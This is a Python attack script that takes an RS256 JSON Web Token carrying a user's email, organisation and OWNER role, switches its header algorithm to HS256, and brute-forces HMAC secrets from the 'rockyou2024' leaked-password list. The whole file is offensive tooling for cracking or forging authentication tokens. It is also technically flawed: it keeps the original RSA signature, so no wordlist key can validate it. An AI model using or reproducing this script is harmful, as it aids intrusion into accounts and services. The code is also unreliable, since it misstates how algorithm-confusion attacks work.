import jwt
import base64
import json

# Original JWT token with RS256 algorithm
token = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxODY2NzciLCJlbWFpbCI6Imhhd2tmNDA2QGhhY2tib3QuaW4iLCJvcmdJZCI6ODc4NDQsIm9yZyI6Imhhd2tmLWNyZXciLCJ1c2VyVHlwZSI6Ik9XTkVSIiwidHlwZSI6ImFjY2VzcyIsImlhdCI6MTcyOTUwMzI1MCwiZXhwIjoxNzI5NTA2MjUwfQ.OLjGlB9VfDWLGtbDnpJ5lPOeTuS1jq7nkqBJeub3Qvs3B0MZuA6XTXLptoV9nXWAuzEXRyat6B2cBkghHju8mIYs62Q76RK1e1bZIuXTf68LyzI7SZsfd0TSswJmuNlkk3RaiCvUvmna2QV1CHBKBLtKI7AsT4htsa4yMRNUN4T8dOUuPruR8rzLsidvkh8JHp-yTWBUsljL_iZU9fZ7cY1ypPxE0xWgFO-YQnKzuewPPpRKlD-Xvd2erY7XL5FZ4TRowH3NPP84Dzae-iP0pSZDl4dmsxgSReSjzJrJbr76FRIbCLieukrIiKpuX3uhO4O5t8IzbTj27ZynIE8wXw'

# Decode the JWT header (base64)
header = token.split('.')[0]
decoded_header = base64.urlsafe_b64decode(header + '==').decode('utf-8')

# Modify the header to use HS256 instead of RS256
header_dict = json.loads(decoded_header)
header_dict['alg'] = 'HS256'

# Re-encode the header
new_header = base64.urlsafe_b64encode(json.dumps(header_dict).encode()).decode('utf-8').rstrip('=')

# Rebuild the JWT with the new header
new_token = new_header + '.' + token.split('.')[1] + '.' + token.split('.')[2]

# Try to brute-force decode the token using each key in the wordlist, reading line by line
with open('rockyou2024.txt', 'r', encoding='latin-1') as file:
    for key in file:
        key = key.strip()  # Remove any leading/trailing whitespace
        try:
            # Try to decode the modified token with the current key
            decoded = jwt.decode(new_token, key, algorithms=['HS256'])
            print(f"Successful decode with key: {key}")
            print(f"Decoded JWT payload: {decoded}")
            break  # Exit loop if successful
        except jwt.ExpiredSignatureError:
            print(f"Key '{key}' has expired.")
        except jwt.InvalidTokenError:
            print(f"Key '{key}' failed to decode.")
        except jwt.InvalidKeyError:
            print(f"Key '{key}' is invalid for HMAC (HS256). Skipping...")
        except Exception as e:
            print(f"An error occurred: {e}")
